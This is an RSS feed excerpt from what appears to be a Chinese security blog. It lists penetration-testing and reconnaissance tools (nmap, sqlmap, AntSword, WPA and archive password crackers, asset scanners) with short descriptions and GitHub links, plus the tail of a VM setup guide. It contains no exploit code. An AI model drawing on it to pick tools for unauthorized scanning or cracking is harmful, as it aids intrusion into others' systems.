&lt;p&gt;虚拟机内存可用推荐设置，当然安装后也可以修改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络连接通常使用 NAT，如果使用环境不限制入网设备数量可以使用桥接模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;随后一路使用默认设置一路 “下一步” 即可，在指定磁盘容量时建议先预设好自己所安装的虚拟机要用来做什么，会安装什么软件，然后设置好适当大小的最大磁盘大小，同时选择将虚拟磁盘拆分为多个文件，因为如果后期容量不足增加容量后，打开虚拟机进行磁盘分配的操作较为麻烦（其实和物理机上加装硬盘然后分区的操作大同小异，只是同样麻烦）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;随后就是正常的系统安装过程，这部分就不再赘述，根据个人需求选择安装选项即可&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/tools-1/</guid>
            <title>工具集（长期更新……大概？）</title>
            <link>https://mobius-0.github.io/security/tools-1/</link>
            <category>网络安全</category>
            <category>工具</category>
            <pubDate>Wed, 16 Nov 2022 19:28:43 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Burp suite&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;渗透测试中常见的工具，基于 java 编写，尽管只有社区版免费，但功能依旧强大&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Wireshark&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实用的网络抓包分析软件&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;WinHex&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;常用的十六进制分析工具，可用于检查和修复文件，也可以用来隐藏和复现某些信息&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;masscan&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款开源的跨平台的端口扫描工具，速度较快，但漏报相应较多，通常在内网中使用&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;nmap&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款开放源代码的网络探测和安全审核工具，设计目标是快速地扫描大型网络 &lt;span class=&#34;spoiler&#34; title=&#34;你知道的太多了&#34;&gt;但是通常都很慢&lt;/span&gt; 。除了端口扫描还可以对扫描目标的网络状态等进行判断，所以通常被用来做安全审查&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;sqlmap&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款开源的渗透测试工具，可用于自动检测和利用 SQL 注入漏洞&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;VirtualBox&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;开源的虚拟机软件，可用于在 Windows 或 Linux 主机上安装运行各类系统的虚拟机&lt;/p&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;VMware Workstation&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;业界知名的虚拟机软件，用户可在同一主机运行多台虚拟机进行各项测试&lt;/p&gt;
&lt;ol start=&#34;9&#34;&gt;
&lt;li&gt;Adobe Photoshop&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;常用的图像处理软件&lt;/p&gt;
&lt;ol start=&#34;10&#34;&gt;
&lt;li&gt;Adobe Audition&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;常用的音频处理软件&lt;/p&gt;
&lt;ol start=&#34;11&#34;&gt;
&lt;li&gt;AntSword&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款开源的跨平台网站管理工具&lt;/p&gt;
&lt;ol start=&#34;12&#34;&gt;
&lt;li&gt;IDA Pro&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款功能丰富的跨平台多处理器反汇编程序和调试器&lt;/p&gt;
&lt;ol start=&#34;13&#34;&gt;
&lt;li&gt;Elcomsoft Forensic Disk Decryptor&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实时解密 BitLocker、PGP 以及 TrueCrypt 加密磁盘，可完全解密所有的文件或实时解密文件，用户可以选择解密所有文件并访问或者实时解密文件。&lt;/p&gt;
&lt;ol start=&#34;14&#34;&gt;
&lt;li&gt;Elcomsoft Wireless Security Auditor&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款审核无线网络 Wi-Fi 的安全性，检查无线网络和信道的工具，可用于嗅探无线流量并破解 WPA/WPA2 密码&lt;/p&gt;
&lt;ol start=&#34;15&#34;&gt;
&lt;li&gt;Advanced Archive Password Recovery&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款破解 ZIP 和 RAR 文件的密码工具，完美底层优化有助于更快地完成工作，能够保证在一小时之内恢复特定类型的压缩文件&lt;/p&gt;
&lt;ol start=&#34;16&#34;&gt;
&lt;li&gt;Notepad++&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;功能强大的记事本 max pro plus（bushi）&lt;/p&gt;
&lt;h1 id=&#34;浏览器插件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#浏览器插件&#34;&gt;#&lt;/a&gt; 浏览器插件&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Tamermonkey&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实用的用户脚本管理器，可兼容 Firefox、Edge、chrome、Opera、Safari 等浏览器&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Wappalyzer&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款信息收集插件，可方便地查看当前站点的服务器型号、版本、服务器端语言等信息&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Shodan&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Shodan 插件能够告诉你网站在哪里托管 (国家，城市) ，谁拥有 IP 和其他服务 / 端口是开放的。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;FoxyProxy&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Firefox 浏览器上的一款代理管理工具&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Proxy SwitchyOmega&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一款代理管理插件，可轻松快捷地管理和切换多个代理设置&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;HackBar&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Firefox 浏览器上的一款网站 URL 渗透工具&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;Flagfox&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Firefox 浏览器上的一款显示当前服务器位置国旗的插件&lt;/p&gt;
&lt;h1 id=&#34;搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索引擎&#34;&gt;#&lt;/a&gt; 搜索引擎&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;fofa&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb2ZhLmluZm8v&#34;&gt;FOFA&lt;/span&gt; 是白帽汇推出的一款网络空间资产搜索引擎。它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Zoomeye&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuem9vbWV5ZS5vcmcv&#34;&gt;ZoomEye&lt;/span&gt;（“钟馗之眼”）—— 全球网络空间测绘的领导者，是知道创宇旗下 404 实验室驱动打造的中国第一款，同时也是全球著名的网络空间搜索引擎。通过分布在全球的大量测绘节点，针对全球范围内的 IPv4、IPv6 地址库及网站域名库进行 24 小时不间断探测、识别，根据对多个服务端口协议进行测绘，最终实现对整体或局部地区的网络空间画像。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;shodan&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cvc2hvZGFuLmlvLw==&#34;&gt;shodan&lt;/span&gt; 世界上第一个互联网连接设备的搜索引擎，也是世界有名的网络空间搜索引擎&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;360quake&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9xdWFrZS4zNjAubmV0L3F1YWtlLyMvaW5kZXg=&#34;&gt;360 QUAKE Vscan&lt;/span&gt; 是 360 开发的一款网络空间测绘引擎，Quake 网络空间测绘系统是 360 安全大脑 - 测绘云的核心系统，持续性探测全球 IPv4、IPv6 地址，做到实时感知全球网络空间中各类资产并发现其安全风险&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/tools/</guid>
            <title>渗透测试工具收集</title>
            <link>https://mobius-0.github.io/security/tools/</link>
            <category>网络安全</category>
            <category>工具</category>
            <pubDate>Wed, 16 Nov 2022 19:28:43 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
&lt;h2 id=&#34;综合工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#综合工具&#34;&gt;#&lt;/a&gt; 综合工具&lt;/h2&gt;
&lt;h3 id=&#34;sitescan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sitescan&#34;&gt;#&lt;/a&gt; SiteScan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;专注一站式解决渗透测试的信息收集任务。包括域名 ip 历史解析、nmap 常见端口爆破、子域名信息收集、旁站信息收集、whois 信息收集、网站架构分析、cms 解析、备案号信息收集、CDN 信息解析、是否存在 waf 检测、后台寻找以及生成检测结果 html 报告表等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tyYWNlcjEyNy9TaXRlU2Nhbg==&#34;&gt;https://github.com/kracer127/SiteScan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;nemo_go&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nemo_go&#34;&gt;#&lt;/a&gt; nemo_go&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Nemo 是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用 Golang 完全重构了原 Python 版本。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hhbmMwMGwvbmVtb19nbw==&#34;&gt;https://github.com/hanc00l/nemo_go&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;linglong&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linglong&#34;&gt;#&lt;/a&gt; linglong&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款资产巡航扫描系统。系统定位是通过 masscan+nmap 无限循环去发现新增资产，自动进行端口弱口令爆破 /、指纹识别、XrayPoc 扫描。主要功能包括:  &lt;code&gt;资产探测&lt;/code&gt; 、 &lt;code&gt;端口爆破&lt;/code&gt; 、 &lt;code&gt;Poc扫描&lt;/code&gt; 、 &lt;code&gt;指纹识别&lt;/code&gt; 、 &lt;code&gt;定时任务&lt;/code&gt; 、 &lt;code&gt;管理后台识别&lt;/code&gt; 、 &lt;code&gt;报表展示&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2F3YWtlMXQvbGluZ2xvbmc=&#34;&gt;https://github.com/awake1t/linglong&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;appinfoscanner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appinfoscanner&#34;&gt;#&lt;/a&gt; AppInfoScanner&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款适用于以 HW 行动 / 红队 / 渗透测试团队为场景的移动端 (Android、iOS、WEB、H5、静态网站) 信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态 WEB 站点中关键的资产信息并提供基本的信息输出，如：Title、Domain、CDN、指纹信息、状态信息等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tlbHZpbkJlbi9BcHBJbmZvU2Nhbm5lcg==&#34;&gt;https://github.com/kelvinBen/AppInfoScanner&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;banli-资产扫描工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#banli-资产扫描工具&#34;&gt;#&lt;/a&gt; Banli - 资产扫描工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Banli 是一款极其简单好用的高危资产识别和高危漏洞扫描工具。Banli 要解决的问题是如何快速识别企业的高危资产，如何快速扫描企业的高危漏洞。包括 Web 资产、中间件资产、框架资产、安全设备等高危资产的识别，包括 Web 漏洞、命令执行漏洞、反序列化等高危漏洞的扫描.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0dvcWkvQmFubGk=&#34;&gt;https://github.com/Goqi/Banli&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;uture_box&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#uture_box&#34;&gt;#&lt;/a&gt; uture_Box&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;集合渗透测试常用工具对目标进行一键扫描。包含多个 github 优秀的开源工具，只需传入目标，即可启动收集的工具同时对目标进行扫描，将结果统一格式化输出。现有两个模块的工具：collect（信息收集）与 vulscan（漏洞扫描）包含功能：目录扫描、子域名爆破、指纹识别、Cms 识别、Waf 识别、Js 检测 url、漏洞扫描&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Y2Sk8vU3V0dXJlX0JveA==&#34;&gt;https://github.com/F6JO/Suture_Box&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ip2domain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ip2domain&#34;&gt;#&lt;/a&gt; ip2domain&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;批量查询 ip 对应域名、备案信息、百度权重。在批量挖 SRC 时，通常会用较新的漏洞 POC 批量跑 fofa 或其他空间测绘的相关资产 ip，该工具可用于对跑到的 ip 批量查询域名及百度权重、备案信息，快速确定 ip 所属企业，方便提交漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NtYTExTmV3L2lwMmRvbWFpbg==&#34;&gt;https://github.com/Sma11New/ip2domain&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;enscan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enscan&#34;&gt;#&lt;/a&gt; ENScan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;企业基本信息（法人、电话、公司地址等等）* 企业 ICP 备案号以及网站企业 APP 信息企业微信公众号信息企业微博信息子公司的基本信息供应商信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dncHNlYy9FTlNjYW4=&#34;&gt;https://github.com/wgpsec/ENScan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;yakit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yakit&#34;&gt;#&lt;/a&gt; YAKIT&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;YAK 是国际上首个致力于网络安全底层能力融合的垂直开发语言，提供了非常强大的安全能力。Yak 是绝大部分 “数据描述语言 / 容器语言” 的超集，具备 Go 所有能力与库生态，VSCode 插件等，语法可自定义，是图灵完备的脚本语言，完全国产。通过函数提供各类底层安全能力，包括端口扫描、指纹识别、poc 框架、shell 管理、MITM 劫持、强大的插件系统等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lha2xhbmcveWFraXQ=&#34;&gt;https://github.com/yaklang/yakit&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;水泽-信息收集自动化工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#水泽-信息收集自动化工具&#34;&gt;#&lt;/a&gt; 水泽 - 信息收集自动化工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点。一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C 段 IP 等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzB4NzI3L1NodWlaZV8weDcyNw==&#34;&gt;https://github.com/0x727/ShuiZe_0x727&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;goscan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#goscan&#34;&gt;#&lt;/a&gt; GoScan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;GoScan 是采用 Golang 语言编写的一款分布式综合资产管理系统，Web 端负责展示数据和接受输入，Client 端负责任务运行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NURi1NaXNzRmVuZy9Hb1NjYW4=&#34;&gt;https://github.com/CTF-MissFeng/GoScan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;szhe_scan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#szhe_scan&#34;&gt;#&lt;/a&gt; SZhe_Scan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;碎遮 SZhe_Scan Web 漏洞扫描器，基于 python Flask 框架，对输入的域名 / IP 进行全面的信息搜集，漏洞扫描，可自主添加 POC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NsMHVkRzBkL1NaaGVfU2Nhbg==&#34;&gt;https://github.com/Cl0udG0d/SZhe_Scan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;raccoon&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#raccoon&#34;&gt;#&lt;/a&gt; Raccoon&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款用于侦察和漏洞扫描的高性能攻击性安全工具。从获取 DNS 记录，TLS 数据，WHOIS 信息检索，WAF 存在检测以及目录爆破，子域枚举等所有操作。每次扫描结果都将会输出保存到相应的文件中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2V2eWF0YXJtZWdlZC9SYWNjb29u&#34;&gt;https://github.com/evyatarmeged/Raccoon&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;scannn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scannn&#34;&gt;#&lt;/a&gt; Scannn&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款红队辅助扫描工具，针对多端口多 IP 的端口扫描与特征分析程序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1hpYW9CYWktMTIxMzgvU0NBTk5O&#34;&gt;https://github.com/XiaoBai-12138/SCANNN&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;tsunami&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tsunami&#34;&gt;#&lt;/a&gt; Tsunami&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Tsunami 是一款功能强大的通用网络安全扫描工具，除此之外，它还是一个可扩展的插件系统，可以帮助广大安全研究人员以高可信度的方式检测和扫描高危严重漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS90c3VuYW1pLXNlY3VyaXR5LXNjYW5uZXI=&#34;&gt;https://github.com/google/tsunami-security-scanner&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ratel&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ratel&#34;&gt;#&lt;/a&gt; ratel&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ratel (獾) 是一个由 rust 开发的信息搜集工具，专注 web 资产发现，支持从 fofa，zoomeye API 查询，提供详细的配置参数，可靠，可以从错误中恢复查询，自动去重。同时也支持主动扫描端口，探测 http，提取 https 证书中域名。ratel 提供细粒度的 http poc 探测模块，支持多请求的 poc，利用自定义正则表达式提取响应内容并作为后续请求的变量。ratel 输出格式为 csv。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2g0Y251bGwvcmF0ZWw=&#34;&gt;https://github.com/h4cnull/ratel&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;onlinetools-线上信息收集工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#onlinetools-线上信息收集工具&#34;&gt;#&lt;/a&gt; onlinetools - 线上信息收集工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一款线上工具箱，收集整理了一些渗透测试过程中常见的需求（病句？）&lt;br /&gt;
现在已经包含的功能有：&lt;br /&gt;
在线 cms 识别 | 信息泄露 | 工控 | 系统 | 物联网安全 | cms 漏洞扫描 | nmap 端口扫描 | 子域名获取&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ljZXloZXhtYW4vb25saW5ldG9vbHM=&#34;&gt;https://github.com/iceyhexman/onlinetools&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;jud-scan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jud-scan&#34;&gt;#&lt;/a&gt; JuD-Scan&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;JuD-Scan 定位是一个资产发现和识别工具；其特色功能在于快速识别 Web 指纹信息，定位资产类型。辅助红队快速定位目标资产信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL20wc3dheS9KdUQtU2Nhbg==&#34;&gt;https://github.com/m0sway/JuD-Scan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;searchmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#searchmap&#34;&gt;#&lt;/a&gt; SearchMap&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;searchmap 是一款集域名解析、IP 反查域名、WHOIS 查询、CDN 检测、端口扫描、目录扫描、子域名挖掘为一体的前渗透测试综合信息收集工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FzYW90b21vL1NlYXJjaE1hcA==&#34;&gt;https://github.com/asaotomo/SearchMap&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;apolloscanner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apolloscanner&#34;&gt;#&lt;/a&gt; ApolloScanner&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;自动化巡航扫描框架（可用于红队打点评估）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2IwYmFjL0Fwb2xsb1NjYW5uZXI=&#34;&gt;https://github.com/b0bac/ApolloScanner&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;allin&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#allin&#34;&gt;#&lt;/a&gt; ALLiN&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一个辅助平常渗透测试项目或者攻防项目快速打点的综合工具，由之前写的工具 AG3 改名而来。是一款轻便、小巧、快速、全面的扫描工具。多用于渗透前资产收集和渗透后内网横向渗透。工具从项目上迭代了一些懒人功能（比如提供扫描资产文件中，可以写绝大部分的各种形式的链接 / CIDR, 并在此基础上可以添加任意端口和路径）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1AxLVRlYW0vQWxsaU4=&#34;&gt;https://github.com/P1-Team/AlliN&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;darkeye&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#darkeye&#34;&gt;#&lt;/a&gt; DarkEye&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款主机发现、网段发现、协议爆破、IP 域名碰撞的工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2IxZ2NhdC9EYXJrRXll&#34;&gt;https://github.com/b1gcat/DarkEye&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;wanli&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wanli&#34;&gt;#&lt;/a&gt; WanLi&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 Dirsearch, Subfinder, Ksubdomain, Httpx、nuclei 工具进行快速目标资产检查并对目标资产进行敏感文件、敏感路径、漏洞验证检测。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0V4cExhbmdjbi9XYW5MaQ==&#34;&gt;https://github.com/ExpLangcn/WanLi&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;autoscanner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#autoscanner&#34;&gt;#&lt;/a&gt; Autoscanner&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;输入域名 &amp;gt; 爆破子域名 &amp;gt; 扫描子域名端口 &amp;gt; 发现扫描 web 服务 &amp;gt; 集成报告的全流程全自动扫描器。集成 oneforall、masscan、nmap、dirsearch、crawlergo、xray 等工具，另支持 cdn 识别、网页截图、站点定位；动态识别域名并添加功能、工具超时中断等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3pvbmdkZWlxaWFueGluZy9BdXRvc2Nhbm5lcg==&#34;&gt;https://github.com/zongdeiqianxing/Autoscanner&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;securityservicebox&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#securityservicebox&#34;&gt;#&lt;/a&gt; SecurityServiceBox&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一个既可以满足安服仔日常渗透工作也可以批量刷洞的工具盒子。集合了常见的域名收集、目录扫描、ip 扫描、指纹扫描、PoC 验证等常用工具，方便安服仔快速展开渗透测试&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dpdmVtZWZpdncvU2VjdXJpdHlTZXJ2aWNlQm94&#34;&gt;https://github.com/givemefivw/SecurityServiceBox&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;domain_hunter_pro&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#domain_hunter_pro&#34;&gt;#&lt;/a&gt; domain_hunter_pro&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;domain_hunter 的高级版本，SRC 挖洞、HW 打点之必备！自动化资产收集；快速 Title 获取；外部工具联动；等等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vZG9tYWluX2h1bnRlcl9wcm8=&#34;&gt;https://github.com/bit4woo/domain_hunter_pro&lt;/span&gt;&lt;/p&gt;
